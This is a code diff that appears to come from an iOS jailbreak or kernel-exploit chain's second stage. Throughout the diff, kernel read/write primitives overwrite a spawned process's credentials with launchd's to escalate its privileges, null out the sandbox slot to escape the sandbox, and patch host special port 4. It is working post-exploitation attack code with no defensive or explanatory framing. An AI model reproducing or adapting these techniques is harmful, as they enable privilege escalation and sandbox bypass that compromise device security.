@@ -26,12 +26,24 @@ extern uint64_t self_struct_proc;
 extern uint64_t kern_struct_proc;
 extern uint64_t launchd_struct_proc;
 
-int launch(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
+int launch_stage3(char *binary, char *arg1, char *arg2, char *arg3, char *arg4, char *arg5, char *arg6, char**env) {
     pid_t pd;
     const char* args[] = {binary, arg1, arg2, arg3, arg4, arg5, arg6,  NULL};
     
     int rv = posix_spawn(&pd, binary, NULL, NULL, (char **)&args, env);
-    // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] posix_spawn ret: %d", rv);
+
+    uint64_t spawnedProc = proc_of_pid(pd);
+
+    //borrow launchd ucred
+    uint64_t launchd_ucred = rk64(launchd_struct_proc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+    uint64_t spawned_ucred = rk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED));
+    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), launchd_ucred);
+
+    while (access("/tmp/stage3_got_hsp4", F_OK) != 0) {};
+
+    //restore
+    wk64(spawnedProc + koffset(KSTRUCT_OFFSET_PROC_UCRED), spawned_ucred);
+
     if (rv) return rv;
     
     return 0;
@@ -74,9 +86,9 @@ int main() {
 
   //hsp4 patch
   setHSP4();
-  mach_port_t hsp4 = MACH_PORT_NULL;
-  host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
-  asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] hsp4 = 0x%x", hsp4);
+  // mach_port_t hsp4 = MACH_PORT_NULL;
+  // host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
+  // asl_log(NULL, NULL, ASL_LEVEL_ERR, "[stage2] hsp4 = 0x%x", hsp4);
 
   //prepare stage3
   extract_stage3();
@@ -91,7 +103,7 @@ int main() {
   uint64_t saved_sb = rk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT));
   wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), 0);
 
-  launch(stage3_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+  launch_stage3(stage3_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
 
   //restore sandbox
   wk64(rk64(self_ucred+koffset(KSTRUCT_OFFSET_UCRED_CR_LABEL)) + koffset(KSTRUCT_OFFSET_SANDBOX_SLOT), saved_sb);
